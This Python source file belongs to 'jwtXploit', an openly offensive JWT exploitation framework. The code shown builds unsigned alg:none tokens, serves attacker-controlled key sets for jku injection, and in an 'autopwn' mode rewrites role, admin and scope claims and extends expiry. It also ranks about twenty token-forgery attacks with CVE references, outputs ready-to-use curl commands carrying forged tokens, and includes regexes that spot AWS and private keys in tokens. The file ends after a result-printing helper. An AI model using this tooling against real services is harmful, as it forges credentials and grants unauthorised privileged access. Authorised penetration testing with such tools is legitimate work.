#!/usr/bin/env python3

import jwt
import base64
import argparse
import json
import requests
import os
import sys
import subprocess
import re
import time
import datetime
import threading
import socket
import http.server
import tempfile
from concurrent.futures import ThreadPoolExecutor, as_completed
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.x509 import (
    CertificateBuilder, NameAttribute, Name, random_serial_number,
    BasicConstraints,
)
from cryptography.x509.oid import NameOID
from colorama import init, Fore, Style

init(autoreset=True)

# Global config — populated from CLI args in main()
CONFIG = {
    "proxy":          None,   # e.g. "http://127.0.0.1:8080"
    "ssl_verify":     True,   # set False with --no-ssl-verify
    "timeout":        10,     # seconds, overridden by --timeout
    "original_token": None,   # raw token from argv — used for baseline
    "autopwn":        False,  # --autopwn: run all attacks non-interactively
    "escalate_role":  None,   # --escalate-role: auto-set privilege claims to this value
    "strip_exp":      False,  # --strip-exp: remove nbf/iat and extend exp before signing
    "use_hashcat":    False,  # --hashcat: use GPU hashcat instead of Python threaded BF
    "output_file":    None,   # -o: path to save the report
    "output_format":  "json", # --format: json | txt | md
    "findings":       [],     # accumulated findings for the report
    "quiet":          False,  # --quiet: suppress banner/color, machine-readable output only
    "rate_limit":     0,      # --rate-limit N: max requests/sec (0 = unlimited)
    "jitter":         0,      # --jitter PCT: random ±PCT% added to rate-limit sleep
    "webhook":        None,   # --webhook URL: POST JSON to this URL on every confirmed finding
}


def _validate_proxy(proxy_url):
    """
    Validate proxy URL and warn if SOCKS5 is requested but PySocks is missing.
    Returns the proxy URL unchanged (requests handles the rest).
    """
    if not proxy_url:
        return proxy_url
    if proxy_url.lower().startswith("socks"):
        try:
            import socks  # noqa: F401  (PySocks)
        except ImportError:
            print(Fore.RED + "[!] SOCKS proxy requested but PySocks is not installed.")
            print(Fore.RED + "    Run: pip install PySocks")
            sys.exit(1)
    allowed = ("http://", "https://", "socks4://", "socks5://", "socks5h://")
    if not any(proxy_url.lower().startswith(p) for p in allowed):
        print(Fore.RED + f"[!] Unrecognised proxy scheme in '{proxy_url}'.")
        print(Fore.RED + "    Supported: http://, https://, socks4://, socks5://, socks5h://")
        sys.exit(1)
    return proxy_url


# ── Phase 7 helpers ───────────────────────────────────────────

def _rate_sleep():
    """Sleep between HTTP requests to honour --rate-limit and --jitter."""
    n = CONFIG.get("rate_limit", 0)
    if not n:
        return
    import random
    delay = 1.0 / n
    pct   = CONFIG.get("jitter", 0) / 100.0
    if pct:
        delay *= 1 + random.uniform(-pct, pct)
    time.sleep(max(delay, 0))


def _qprint(msg, color=None):
    """
    Print that respects --quiet mode.
    In quiet mode only lines prefixed FOUND: / CLEAN: / ERROR: are emitted
    (machine-readable for CI pipelines). All others are suppressed.
    """
    if CONFIG.get("quiet"):
        if any(msg.lstrip().startswith(p) for p in ("FOUND:", "CLEAN:", "ERROR:", "INFO:")):
            print(msg)
        return
    if color:
        print(color + msg)
    else:
        print(msg)


def _notify_webhook(finding):
    """POST a confirmed finding JSON to the configured --webhook URL (fire-and-forget)."""
    url = CONFIG.get("webhook")
    if not url:
        return
    payload = {
        "source":   "jwtXploit",
        "attack":   finding.get("attack"),
        "token":    finding.get("token", "")[:120],
        "delivery": finding.get("delivery"),
        "reason":   finding.get("verify_reason"),
        "cve":      str(_cve_for_attack(finding.get("attack", ""))),
        "time":     finding.get("timestamp"),
    }
    # Slack-compatible format
    slack_text = (
        f"🚨 *jwtXploit — JWT Vulnerability Confirmed*\n"
        f">*Attack:* {payload['attack']}\n"
        f">*CVE:* {payload['cve']}\n"
        f">*Via:* {payload['delivery']}\n"
        f">*Reason:* {payload['reason']}\n"
        f">*Token (truncated):* `{payload['token']}`"
    )
    body = {"text": slack_text, "data": payload}
    try:
        requests.post(url, json=body, timeout=5)
    except Exception:
        pass  # webhook failures must never interrupt the scan


def _poc_curl(token, delivery, url, method="GET"):
    """
    Build and return a ready-to-paste curl PoC command for a confirmed finding.
    delivery is one of the delivery string values stored in CONFIG['findings'].
    """
    method_flag = "" if method == "GET" else f"-X {method} "
    token_short = token[:80] + ("..." if len(token) > 80 else "")

    if delivery and delivery.startswith("Cookie:"):
        cookie_name = delivery.split("Cookie:", 1)[1].strip()
        return f'curl -sk {method_flag}-b "{cookie_name}={token}" "{url}"'
    elif delivery and delivery.startswith("Authorization:"):
        scheme = delivery.split("Authorization:", 1)[1].strip()
        return f'curl -sk {method_flag}-H "Authorization: {scheme} {token}" "{url}"'
    elif delivery:
        # custom header like X-Auth-Token
        return f'curl -sk {method_flag}-H "{delivery}: {token}" "{url}"'
    else:
        return f'curl -sk {method_flag}-H "Authorization: Bearer {token}" "{url}"'


def gold_gradient_text(text):
    # 256-color codes for a goldish gradient (orange to yellow)
    gold_colors = [202, 208, 214, 220, 226]  # from dark orange to bright yellow
    gradient_text = ""
    length = len(text)
    for i, ch in enumerate(text):
        if ch == " ":
            gradient_text += ch
        else:
            # cycle through gold_colors based on position
            color_code = gold_colors[(i * len(gold_colors)) // length]
            gradient_text += f"\033[38;5;{color_code}m{ch}"
    gradient_text += Style.RESET_ALL
    return gradient_text

def print_banner():
    logo = """
       ___       ________  _  __       ______  _ ______
      / / |     / /_  __/ | |/ /____  / / __ \\(_)_  __/
 __  / /| | /| / / / /    |   // __ \\/ / / / / / / /   
/ /_/ / | |/ |/ / / /    /   |/ /_/ / / /_/ / / / /    
\\____/  |__/|__/ /_/____/_/|_/ .___/_/\\____/_/ /_/     
                            /_/                        
"""
    print(gold_gradient_text(logo))

    print(f"""{Fore.YELLOW}{Style.BRIGHT}  🔐 jwtXpl0iT - JWT Exploitation Framework
{Fore.CYAN}   👨‍💻 Developer: {Style.BRIGHT}Shoaib Bin Rashid {Style.NORMAL}(aka {Fore.RED}{Style.BRIGHT}R3D_XplOiT{Fore.CYAN})
{Fore.GREEN}    📎 GitHub: {Style.BRIGHT}{Fore.GREEN}https://github.com/Shoaib-Bin-Rashid/Pentest-Automated-Tools/Web/jwtXploit
{Style.RESET_ALL}
""")


def pad_b64(b64_str):
    return b64_str + '=' * (-len(b64_str) % 4)

def decode_token(token):
    try:
        return jwt.decode(token, options={"verify_signature": False})
    except Exception as e:
        print(f"[!] Error decoding payload: {e}")
        return {}

def get_header(token):
    try:
        return jwt.get_unverified_header(token)
    except Exception as e:
        print(f"[!] Error decoding header: {e}")
        return {}


# ──────────────────────────────────────────────────────────────
#  PHASE 2 HELPERS
# ──────────────────────────────────────────────────────────────

def apply_exp_strip(payload):
    """Remove nbf/iat and push exp 10 years forward when --strip-exp is active."""
    if not CONFIG.get("strip_exp"):
        return payload
    p = dict(payload)
    p.pop("nbf", None)
    p.pop("iat", None)
    p["exp"] = int(time.time()) + (10 * 365 * 24 * 3600)
    print(Fore.YELLOW + "[--strip-exp] Removed nbf/iat  |  exp pushed → 10 years from now")
    return p


def scan_token_secrets(token):
    """Scan the decoded JWT payload for embedded sensitive data and warn the user."""
    decoded = decode_token(token)
    if not decoded:
        return
    payload_str = json.dumps(decoded)
    patterns = {
        "AWS Access Key":  r"AKIA[0-9A-Z]{16}",
        "PEM Private Key": r"-----BEGIN.{0,30}PRIVATE KEY-----",
        "Password field":  r'"pass(?:word|wd)?"\s*:\s*"[^"]{3,}"',
        "API Key field":   r'"api[_\-]?key"\s*:\s*"[^"]{6,}"',
        "Secret field":    r'"secret"\s*:\s*"[^"]{3,}"',
        "Email address":   r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}',
        "Private IP":      r'\b(?:10\.|172\.(?:1[6-9]|2\d|3[01])\.|192\.168\.)\d{1,3}\.\d{1,3}\b',
    }
    found = [label for label, pat in patterns.items()
             if re.search(pat, payload_str, re.IGNORECASE)]
    if found:
        print(Fore.RED + Style.BRIGHT + "\n⚠️   EMBEDDED SECRETS DETECTED IN TOKEN PAYLOAD:")
        for item in found:
            print(Fore.RED + f"     ▸ {item}")
        print(Fore.RED + "     Handle this token carefully!\n")


def manual_none_token(header_dict, payload_dict):
    """Manually encode a JWT with an arbitrary alg string and no signature."""
    h = base64.urlsafe_b64encode(
        json.dumps(header_dict, separators=(",", ":")).encode()
    ).rstrip(b'=').decode()
    p = base64.urlsafe_b64encode(
        json.dumps(payload_dict, separators=(",", ":")).encode()
    ).rstrip(b'=').decode()
    return f"{h}.{p}."


# ──────────────────────────────────────────────────────────────
#  PHASE 3 HELPERS
# ──────────────────────────────────────────────────────────────

def find_free_port(preferred=8888):
    """Return preferred port if free, otherwise let OS assign one."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind(("0.0.0.0", preferred))
            return preferred
        except OSError:
            s.bind(("0.0.0.0", 0))
            return s.getsockname()[1]


def get_lan_ip():
    """Detect the machine's LAN IP (works even without internet)."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"


def start_jwks_server(jwks_data, port=8888):
    """
    Spin up a lightweight HTTP server (stdlib only) to serve JWKS JSON.
    Responds to ANY GET path with the JWKS — handles both / and /.well-known/jwks.json.
    Returns the running HTTPServer instance (caller must call .shutdown() when done).
    """
    jwks_bytes = json.dumps(jwks_data).encode()

    class JWKSHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(jwks_bytes)

        def log_message(self, fmt, *args):
            pass  # silence request logs — keep terminal clean

    server = http.server.HTTPServer(("0.0.0.0", port), JWKSHandler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    return server


# ──────────────────────────────────────────────────────────────
#  PHASE 4 — CVE MAP, RECOMMENDER, DECODE MODE, REPORTING
# ──────────────────────────────────────────────────────────────

# Map internal attack keys → (CVE, CVSS, short description)
CVE_MAP = {
    "unverified":     ("CVE-2015-9235",  "9.8", "Signature not verified — library accepts tampered tokens"),
    "alg_none":       ("CVE-2015-9235",  "9.8", "alg:none accepted — no signature required"),
    "algo_confusion": ("CVE-2016-5431",  "9.1", "RS256 → HS256 algorithm confusion attack"),
    "jwk_inject":     ("CVE-2018-0114",  "9.8", "JWK self-signed header injection"),
    "jku_inject":     ("CVE-2018-0114",  "9.8", "JKU header injection — attacker-hosted key set"),
    "psychic_sig":    ("CVE-2022-21449", "9.8", "Java ECDSA Psychic Signature — zero-value r/s bypass"),
    "kid_traversal":  ("N/A",            "8.2", "KID path traversal — empty key via /dev/null"),
    "kid_sqli":       ("N/A",            "9.1", "KID SQL injection — UNION SELECT controls signing key"),
    "kid_ssrf":       ("N/A",            "8.6", "KID SSRF — server fetches key from attacker-controlled URL"),
    "null_sig":       ("N/A",            "7.5", "Null/stripped signature accepted by JWT library"),
    "weak_key":       ("N/A",            "8.8", "Weak or guessable HMAC signing secret"),
    "x5c_inject":     ("CVE-2018-0114",  "9.8", "x5c self-signed certificate injection — server trusts embedded cert"),
    "typ_cty":        ("N/A",            "7.5", "typ/cty header mutation — bypasses audience/scope validation"),
    "sig2n":          ("N/A",            "9.1", "sig2n key recovery — RS256 public key recovered from 2 tokens"),
    "jwks_disc":      ("N/A",            "9.1", "JWKS discovery key confusion — real server key used as HMAC secret"),
    "claim_fuzz":     ("N/A",            "9.8", "Privilege claim fuzzing — role/isAdmin/scope/permissions permutations"),
    "cookie_sec":     ("N/A",            "6.5", "JWT cookie missing HttpOnly/Secure/SameSite security flags"),
    "replay":         ("N/A",            "8.1", "JWT replay attack — token accepted multiple times (no replay protection)"),
    "es384_psychic":  ("CVE-2022-21449", "9.8", "ES384/ES512 psychic signature — zero-value r/s bypass (same root as ES256)"),
    "ps256_blinding": ("N/A",            "8.5", "PS256 RSA-PSS blinding — zero-length/crafted signature bypass"),
    "graphql_jwt":    ("N/A",            "9.1", "GraphQL JWT injection via query variable / header confusion"),
}

# Maps attack name substrings → CVE_MAP keys (for print_result lookup)
_ATTACK_CVE_KEYS = {
    "unverified signature":   "unverified",
    "alg:none":               "alg_none",
    "alg:":                   "alg_none",
    "algorithm confusion":    "algo_confusion",
    "jwk header":             "jwk_inject",
    "jku header":             "jku_inject",
    "psychic signature":      "psychic_sig",
    "kid path traversal":     "kid_traversal",
    "kid sqli":               "kid_sqli",
    "kid sql":                "kid_sqli",
    "kid ssrf":               "kid_ssrf",
    "null signature":         "null_sig",
    "weak signing":           "weak_key",
    "x5c":                    "x5c_inject",
    "typ/cty":                "typ_cty",
    "sig2n":                  "sig2n",
    "jwks key discovery":     "jwks_disc",
    "jwks endpoint":          "jwks_disc",
    "claim fuzz":             "claim_fuzz",
    "privilege claim":        "claim_fuzz",
    "cookie security":        "cookie_sec",
    "httponly":               "cookie_sec",
    "replay":                 "replay",
    "es384":                  "es384_psychic",
    "es512":                  "es384_psychic",
    "ps256":                  "ps256_blinding",
    "graphql":                "graphql_jwt",
}


def _cve_for_attack(attack_name):
    """Return (cve_id, cvss, desc) for a given attack name string, or None."""
    name_lower = attack_name.lower()
    for substr, cve_key in _ATTACK_CVE_KEYS.items():
        if substr in name_lower:
            return CVE_MAP.get(cve_key)
    return None


def recommend_attacks(header, payload):
    """Analyse the token header/payload and print ranked attack suggestions."""
    alg  = header.get("alg", "").upper()
    tips = []

    if alg in ("RS256", "RS384", "RS512", "PS256", "PS384", "PS512"):
        tips.append(("CRITICAL", "→ #7  Algorithm Confusion  (RS/PS alg detected — try public key as HMAC secret)"))
    if alg in ("ES256", "ES384", "ES512"):
        tips.append(("CRITICAL", "→ #8  ES256 Psychic Signature  (CVE-2022-21449 — zero r/s bypass)"))
        tips.append(("HIGH",     "→ #7  Algorithm Confusion  (EC alg — worth trying)"))
    if "jku" in header:
        tips.append(("CRITICAL", "→ #5  JKU Injection  (jku header present — replace with your JWKS server)"))
    if "jwk" in header:
        tips.append(("CRITICAL", "→ #4  JWK Injection  (embedded JWK — replace with attacker key)"))
    if "kid" in header:
        tips.append(("HIGH",     "→ #6  KID Path Traversal  (kid header present)"))
        tips.append(("HIGH",     "→ #10 KID SQL Injection  (if kid queries a database)"))
        tips.append(("HIGH",     "→ #11 KID SSRF  (if kid is fetched as a URL)"))
    if "x5c" in header or "x5u" in header:
        tips.append(("CRITICAL", "→ #13 x5c Header Injection  (embedded cert — replace with self-signed)"))
    if alg in ("HS256", "HS384", "HS512"):
        tips.append(("HIGH",     "→ #3  Weak Key Brute Force  (HMAC — try rockyou / jwt-secrets wordlist)"))
    tips.append(("MEDIUM",   "→ #2  alg:none  (7 case variants — always worth a shot)"))
    tips.append(("MEDIUM",   "→ #9  Null Signature  (some libs skip sig check entirely)"))
    tips.append(("LOW",      "→ #1  Unverified Signature  (swap payload, keep original sig)"))
    tips.append(("INFO",     "→ #17 Claim Fuzz  (50+ role/isAdmin/scope permutations)"))
    tips.append(("INFO",     "→ #20 Cookie Security Flags  (run with --url to scan)"))
    tips.append(("INFO",     "→ #21 Replay Detect  (check if server rejects reused tokens)"))

    exp = payload.get("exp")
    if exp and exp < int(time.time()):
        tips.append(("INFO",   "Token is expired — add --strip-exp to extend before attacking"))
    if not exp:
        tips.append(("INFO",   "No exp claim — replay freely, no time restriction"))

    sev_color = {"CRITICAL": Fore.RED, "HIGH": Fore.YELLOW,
                 "MEDIUM": Fore.CYAN,  "LOW": Fore.WHITE, "INFO": Fore.GREEN}

    print(Fore.CYAN + "\n  ⚡ RECOMMENDED ATTACKS (ranked by likelihood):")
    for sev, msg in tips:
        print(sev_color.get(sev, Fore.WHITE) + f"    [{sev:8}]  {msg}")


def decode_mode(token):
    """--decode: full recon of a JWT without attacking anything."""
    header  = get_header(token)
    payload = decode_token(token)
    now     = int(time.time())

    print(Fore.CYAN + "\n" + "═" * 62)
    print(Fore.CYAN + "  🔍  TOKEN RECON")
    print(Fore.CYAN + "═" * 62)

    print(Fore.YELLOW + f"\n  ALGORITHM  : {header.get('alg', 'unknown')}")
    print(Fore.YELLOW + f"  TYPE       : {header.get('typ', 'JWT')}")

    if "kid" in header:
        print(Fore.RED    + f"  KID        : {header['kid']}  ← potential SQLi / traversal / SSRF")
    if "jku" in header:
        print(Fore.RED    + f"  JKU        : {header['jku']}  ← JKU injection surface!")
    if "jwk" in header:
        print(Fore.RED    +  "  JWK        : embedded  ← JWK injection surface!")
    if "x5c" in header:
        print(Fore.RED    +  "  X5C        : embedded cert chain  ← x5c injection surface! (#13)")
    if "x5u" in header:
        print(Fore.RED    + f"  X5U        : {header['x5u']}  ← x5u URL injection surface!")

    exp = payload.get("exp")
    if exp:
        exp_dt = datetime.datetime.fromtimestamp(exp).strftime("%Y-%m-%d %H:%M:%S")
        if exp < now:
            diff = now - exp
            h, m = divmod(diff // 60, 60)
            print(Fore.RED   + f"  EXPIRY     : ⚠️  EXPIRED {h}h {m}m ago  ({exp_dt})")
        else:
            diff = exp - now
            h, m = divmod(diff // 60, 60)
            print(Fore.GREEN + f"  EXPIRY     : ✅ Valid — expires in {h}h {m}m  ({exp_dt})")
    else:
        print(Fore.RED   +  "  EXPIRY     : ⚠️  No exp claim — token never expires")

    for claim_key in ("nbf", "iat"):
        if claim_key in payload:
            ts = datetime.datetime.fromtimestamp(payload[claim_key]).strftime("%Y-%m-%d %H:%M:%S")
            label = "NOT BEFORE" if claim_key == "nbf" else "ISSUED AT "
            print(Fore.YELLOW + f"  {label}  : {ts}")

    interesting = {k: v for k, v in payload.items() if k not in ("exp", "nbf", "iat")}
    if interesting:
        print(Fore.YELLOW + "\n  CLAIMS:")
        for k, v in interesting.items():
            print(Fore.YELLOW + f"    {k:20} = {v}")

    recommend_attacks(header, payload)
    print(Fore.CYAN + "\n" + "═" * 62 + "\n")


def save_report(output_file, fmt):
    """Write accumulated findings to disk in json / txt / md format."""
    findings = CONFIG.get("findings", [])
    confirmed = [f for f in findings if f.get("verified")]

    if not findings:
        print(Fore.YELLOW + "[*] No findings to save (no attacks ran or no tokens generated).")
        return

    target = (CONFIG.get("original_token") or "unknown")[:30] + "..."
    ts     = time.strftime("%Y-%m-%d %H:%M:%S")

    # ── JSON ──────────────────────────────────────────────────
    if fmt == "json":
        data = {
            "tool":      "jwtXploit",
            "generated": ts,
            "token_preview": target,
            "stats": {
                "total_generated": len(findings),
                "confirmed_accepted": len(confirmed),
            },
            "findings": findings,
        }
        content = json.dumps(data, indent=4, default=str)

    # ── TXT ───────────────────────────────────────────────────
    elif fmt == "txt":
        lines = [
            "jwtXploit — Pentest Report",
            f"Generated : {ts}",
            f"Tokens    : {len(findings)} generated  |  {len(confirmed)} confirmed accepted",
            "=" * 62,
        ]
        for i, f in enumerate(findings, 1):
            status = "✅ ACCEPTED" if f.get("verified") else "   generated"
            lines.append(f"\n[{i}] {f['attack']}  [{status}]")
            lines.append(f"    Token   : {f['token'][:80]}...")
            if f.get("verify_reason"):
                lines.append(f"    Reason  : {f['verify_reason']}")
            if f.get("delivery"):
                lines.append(f"    Via     : {f['delivery']}")
        content = "\n".join(lines)

    # ── Markdown ──────────────────────────────────────────────
    elif fmt == "md":
        lines = [
            "# JWT Vulnerability Report",
            f"**Tool:** jwtXploit &nbsp;|&nbsp; **Date:** {ts}",
            "",
            "## Executive Summary",
            f"| Metric | Value |",
            f"|--------|-------|",
            f"| Tokens Generated | {len(findings)} |",
            f"| Confirmed Accepted | **{len(confirmed)}** |",
            "",
            "## Confirmed Findings",
        ]
        if confirmed:
            for f in confirmed:
                cve_info = _cve_for_attack(f["attack"])
                cve_str  = f"{cve_info[0]} (CVSS {cve_info[1]}) — {cve_info[2]}" if cve_info else "N/A"
                lines += [
                    f"### {f['attack']}",
                    f"| Field | Detail |",
                    f"|-------|--------|",
                    f"| CVE / Reference | `{cve_str}` |",
                    f"| Accepted Via | {f.get('delivery', 'N/A')} |",
                    f"| Detection Reason | {f.get('verify_reason', 'N/A')} |",
                    "",
                    "**Forged Token:**",
                    f"```\n{f['token']}\n```",
                    "",
                    "**Modified Payload:**",
                    f"```json\n{json.dumps(f.get('payload', {}), indent=2)}\n```",
                    "",
                    "**Remediation:** Validate the JWT signature server-side with a "
                    "well-maintained library. Enforce a strict algorithm allowlist "
                    "and never trust header-supplied keys.",
                    "",
                ]
                if f.get("poc_curl"):
                    lines += [
                        "**PoC curl command:**",
                        f"```bash\n{f['poc_curl']}\n```",
                        "",
                    ]
        else:
            lines.append("_No tokens were confirmed accepted during this scan._")

        lines += [
            "",
            "## All Generated Tokens",
            "| # | Attack | Status |",
            "|---|--------|--------|",
        ]
        for i, f in enumerate(findings, 1):
            status = "✅ Accepted" if f.get("verified") else "⚪ Generated"
            lines.append(f"| {i} | {f['attack']} | {status} |")

        content = "\n".join(lines)

    # ── SARIF 2.1.0 ───────────────────────────────────────────
    elif fmt == "sarif":
        sev_map = {"9": "error", "8": "error", "7": "warning", "6": "warning"}
        rules   = {}
        results = []
        for f in findings:
            cve_info  = _cve_for_attack(f["attack"])
            rule_id   = (cve_info[0] if cve_info else "JWT-FINDING").replace("-", "_")
            cvss_maj  = (cve_info[1] if cve_info else "5.0")[0]
            level     = sev_map.get(cvss_maj, "note")
            desc      = cve_info[2] if cve_info else f["attack"]
            if rule_id not in rules:
                rules[rule_id] = {
                    "id": rule_id,
                    "name": f["attack"],
                    "shortDescription": {"text": desc},
                    "helpUri": "https://github.com/Shoaib-Bin-Rashid/Pentest-Automated-Tools",
                    "defaultConfiguration": {"level": level},
                    "properties": {
                        "cvss": cve_info[1] if cve_info else "N/A",
                        "tags": ["security", "jwt"],
                    },
                }
            results.append({
                "ruleId": rule_id,
                "level": level if f.get("verified") else "note",
                "message": {
                    "text": f"{'CONFIRMED ACCEPTED' if f.get('verified') else 'Generated'}: {f['attack']}. "
                            f"Delivery: {f.get('delivery', 'N/A')}. Reason: {f.get('verify_reason', '')}",
                },
                "properties": {
                    "token_preview": f["token"][:80] + "...",
                    "payload": f.get("payload", {}),
                    "poc_curl": f.get("poc_curl", ""),
                },
            })
        sarif_doc = {
            "version": "2.1.0",
            "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
            "runs": [{
                "tool": {
                    "driver": {
                        "name": "jwtXploit",
                        "version": "8.0",
                        "informationUri": "https://github.com/Shoaib-Bin-Rashid/Pentest-Automated-Tools",
                        "rules": list(rules.values()),
                    }
                },
                "results": results,
            }]
        }
        content = json.dumps(sarif_doc, indent=2, default=str)

    # ── HTML ──────────────────────────────────────────────────
    elif fmt == "html":
        sev_css = {"9": "#e74c3c", "8": "#e67e22", "7": "#f39c12", "6": "#3498db"}
        rows = []
        for f in findings:
            cve_info = _cve_for_attack(f["attack"])
            cvss_maj = (cve_info[1] if cve_info else "5.0")[0]
            color    = sev_css.get(cvss_maj, "#95a5a6")
            badge    = (f'<span style="background:{color};color:#fff;padding:2px 8px;'
                        f'border-radius:4px;font-size:12px">CVSS {cve_info[1] if cve_info else "N/A"}</span>')
            status   = ('✅ <b>ACCEPTED</b>' if f.get("verified")
                        else '⚪ Generated')
            poc = ""
            if f.get("poc_curl"):
                escaped = f["poc_curl"].replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                poc = (f'<div class="poc"><b>PoC:</b><pre>{escaped}</pre>'
                       f'<button onclick="navigator.clipboard.writeText(\'{f["poc_curl"].replace(chr(39), "&#39;")}\')">📋 Copy</button></div>')
            rows.append(f"""
            <tr>
              <td>{f['attack']} {badge}</td>
              <td>{status}</td>
              <td>{f.get('delivery','N/A')}</td>
              <td>{f.get('verify_reason','')}</td>
            </tr>
            {"<tr><td colspan='4'>" + poc + "</td></tr>" if poc else ""}
            """)
        html_rows = "\n".join(rows)
        content = f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8">
<title>jwtXploit Report — {ts}</title>
<style>
  body{{font-family:monospace;background:#0d1117;color:#c9d1d9;margin:2em}}
  h1{{color:#f0a500}} h2{{color:#58a6ff;border-bottom:1px solid #30363d;padding-bottom:4px}}
  table{{width:100%;border-collapse:collapse;margin-top:1em}}
  th{{background:#161b22;color:#f0a500;padding:8px;text-align:left;border:1px solid #30363d}}
  td{{padding:8px;border:1px solid #30363d;vertical-align:top}}
  tr:hover{{background:#161b22}} .poc{{margin-top:8px}}
  pre{{background:#161b22;padding:12px;border-radius:6px;overflow-x:auto;color:#79c0ff;font-size:12px}}
  button{{background:#238636;color:#fff;border:none;padding:4px 10px;border-radius:4px;cursor:pointer;margin-top:4px}}
  .stat{{display:inline-block;background:#161b22;border:1px solid #30363d;padding:8px 18px;margin:6px;border-radius:8px}}
  .confirmed{{color:#3fb950;font-weight:bold}} .generated{{color:#8b949e}}
</style></head><body>
<h1>🔐 jwtXploit — JWT Vulnerability Report</h1>
<p>Generated: {ts} &nbsp;|&nbsp; Token: <code>{target}</code></p>
<h2>Summary</h2>
<div class="stat">Tokens Generated: <b>{len(findings)}</b></div>
<div class="stat confirmed">Confirmed Accepted: <b>{len(confirmed)}</b></div>
<h2>Findings</h2>
<table>
  <tr><th>Attack</th><th>Status</th><th>Delivery</th><th>Detection Reason</th></tr>
  {html_rows}
</table>
</body></html>"""

    else:
        print(Fore.RED + f"[!] Unknown format '{fmt}' — use json, txt, md, sarif, or html.")
        return

    try:
        with open(output_file, "w", encoding="utf-8") as fp:
            fp.write(content)
        print(Fore.GREEN + f"\n[+] 📄 Report saved → {output_file}  (format: {fmt})")
        print(Fore.GREEN + f"[+] {len(findings)} tokens generated  |  {len(confirmed)} confirmed accepted")
    except Exception as e:
        print(Fore.RED + f"[!] Could not save report: {e}")

def interactive_edit_dict(title, d):
    # AUTOPWN MODE — skip all interaction; optionally escalate role-related claims
    if CONFIG.get("autopwn"):
        role = CONFIG.get("escalate_role")
        if role:
            escalation_fields = {
                "role", "user", "sub", "admin", "administrator",
                "isAdmin", "is_admin", "scope", "permissions", "username",
            }
            for k in list(d.keys()):
                if k in escalation_fields:
                    d[k] = role
                    print(Fore.YELLOW + f"[AUTOPWN] Auto-set '{k}' → '{role}'")
        return apply_exp_strip(d)

    # Define relevant fields for default options
    relevant_fields = {"exp", "user", "role", "sub", "admin", "administrator", "isAdmin", "is_admin", "scope", "permissions","username"}
    default_options = ["admin", "administrator", "user", "true", "false", "Other"]

    while True:
        print(Fore.YELLOW + f"\n{title} values:")
        keys = list(d.keys())
        for i, key in enumerate(keys, 1):
            print(Fore.YELLOW + f"[{i}] {key} = " + Fore.CYAN + f"\"{d[key]}\"")
        print()
        print(Fore.YELLOW + f"[{len(keys)+1}] *ADD A VALUE*")
        print(Fore.YELLOW + f"[{len(keys)+2}] *DELETE A VALUE*")
        print(Fore.YELLOW + "[0] Continue to next step")

        choice = input(Fore.CYAN + "Please select a field number:\n(or 0 or press Enter to Continue)\n> ").strip()
        if choice == "" or choice == "0":
            break
        if not choice.isdigit():
            print(Fore.RED + "[-] Invalid input, please enter a number.")
            continue
        choice = int(choice)

        if 1 <= choice <= len(keys):
            key = keys[choice - 1]
            # If key is relevant, show default options
            if key in relevant_fields:
                print(Fore.CYAN + f"Select a new value for relevant field '{key}':")
                for idx, option in enumerate(default_options, 1):
                    print(Fore.CYAN + f"[{idx}] {option}")
                val_choice = input(Fore.CYAN + "Choose an option number: ").strip()
                if not val_choice.isdigit() or not (1 <= int(val_choice) <= len(default_options)):
                    print(Fore.RED + "[-] Invalid choice, skipping...")
                    continue
                val_choice = int(val_choice)
                if val_choice == len(default_options):  # Other
                    new_val = input(Fore.CYAN + f"Enter custom value for '{key}': ")
                else:
                    new_val = default_options[val_choice - 1]
            else:
                # Non-relevant field, normal input prompt
                new_val = input(Fore.CYAN + f"Enter new value for '{key}': ")

            d[key] = new_val
            print(Fore.GREEN + f"[+] Key '{key}' updated to '{new_val}'.")
        elif choice == len(keys) + 1:  # Add a value
            new_key = input(Fore.CYAN + "Enter new field name: ").strip()
            if not new_key:
                print(Fore.RED + "[-] Field name cannot be empty.")
                continue
            if new_key in d:
                print(Fore.RED + "[-] Field already exists.")
                continue

            # If new key is relevant, show default options else normal input
            if new_key in relevant_fields:
                print(Fore.CYAN + f"Select a value for relevant field '{new_key}':")
                for idx, option in enumerate(default_options, 1):
                    print(Fore.CYAN + f"[{idx}] {option}")
                val_choice = input(Fore.CYAN + "Choose an option number: ").strip()
                if not val_choice.isdigit() or not (1 <= int(val_choice) <= len(default_options)):
                    print(Fore.RED + "[-] Invalid choice, skipping field addition...")
                    continue
                val_choice = int(val_choice)
                if val_choice == len(default_options):  # Other
                    new_val = input(Fore.CYAN + f"Enter custom value for '{new_key}': ")
                else:
                    new_val = default_options[val_choice - 1]
            else:
                new_val = input(Fore.CYAN + "Enter new value: ")

            d[new_key] = new_val
            print(Fore.GREEN + f"[+] Added new field '{new_key}'.")
        elif choice == len(keys) + 2:  # Delete a value
            del_choice = input(Fore.CYAN + "Enter the number of the field to delete: ").strip()
            if not del_choice.isdigit():
                print(Fore.RED + "[-] Invalid input.")
                continue
            del_choice = int(del_choice)
            if 1 <= del_choice <= len(keys):
                del_key = keys[del_choice - 1]
                del d[del_key]
                print(Fore.GREEN + f"[+] Key '{del_key}' deleted.")
            else:
                print(Fore.RED + "[-] Invalid field number.")
        else:
            print(Fore.RED + "[-] Invalid choice.")

    return apply_exp_strip(d)


def print_result(attack_name, token, payload, header):
    print(Fore.CYAN + f"\n[+] {attack_name}")

    # Show CVE reference if one exists for this attack
    cve = _cve_for_attack(attack_name)
    if cve:
        cve_id, cvss, desc = cve
        clr = Fore.RED if cve_id != "N/A" else Fore.YELLOW
        print(clr + f"    ↳ {cve_id}  CVSS:{cvss}  {desc}")

    print(Fore.GREEN  + "[*] Modified JWT Token:")
    print(Fore.GREEN  + token)
